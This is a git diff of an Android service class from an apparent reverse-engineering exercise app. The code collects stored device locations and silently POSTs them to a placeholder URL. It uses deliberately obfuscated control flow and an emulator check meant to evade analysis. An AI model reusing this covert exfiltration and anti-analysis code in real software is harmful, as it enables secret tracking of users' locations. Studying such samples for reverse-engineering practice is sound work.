@@ -10,7 +10,6 @@ import android.os.Build;
 import android.os.Debug;
 import android.os.Handler;
 import android.os.IBinder;
-import android.support.annotation.Nullable;
 import android.util.Log;
 import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
@@ -26,39 +25,47 @@ import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 
 /**
+ * Every x seconds, send all the location collected with a POST call to a URL
+ *
  * Created by Jay on 3/29/2016.
  */
 public class LocationSniffingService extends Service{
 
-    private final static String fingerprintStart = "generic";
     private final static String TAG = "LocationSniffingService";
-    @Nullable
+
+    private static Handler mHandler;
+
     @Override
     public IBinder onBind(Intent intent) {
+
+        if(mHandler != null){
+            mHandler = new Handler();
+            int delay = 300000;
+
+            //Path Obfuscation
+            mHandler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if(thisDoesnotDoAnything())
+                        return;
+                    else
+                        thisAlsoDoesnotDoAnything();
+                }
+            }, delay);
+        }
         return null;
     }
 
+    //Starts the handler which will post every delay seconds
     @Override
     public void onCreate(){
-
-        Handler handler = new Handler();
-        int delay = 300000;
-
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if(thisDoesnotDoAnything())
-                    return;
-                else
-                    thisAlsoDoesnotDoAnything();
-            }
-        }, delay);
     }
 
     private void thisAlsoDoesnotDoAnything(){
 
     }
 
+    //Concats all the locations to send
     private boolean sendQuietly() {
 
         List<Location> locations = LocationStorage.getAllLocation();
@@ -75,13 +82,14 @@ public class LocationSniffingService extends Service{
             builder.append("||");
         }
 
-        sendForReals(builder.toString());
+        actualSend(builder.toString());
 
+        //Logic Obfuscation
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
 
     @TargetApi(Build.VERSION_CODES.KITKAT)
-    private void sendForReals(String s) {
+    private void actualSend(String s) {
         try {
             URL url = new URL("toBeChanged");
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
@@ -109,6 +117,7 @@ public class LocationSniffingService extends Service{
         Log.d(TAG, "Sent");
     }
 
+    //Dummy method - b does not mean anything
     private boolean thisDoesnotDoAnything(){
 
         boolean b = false;
@@ -116,9 +125,10 @@ public class LocationSniffingService extends Service{
         if (isValid())
             b = sendQuietly();
 
-        return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
+        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
 
+    //Check if the environment is an emulated environment - just in case it is being analysed
     private boolean isValid(){
 
         String h1 = "ï<ŠPSÒí¸U1Éà>";
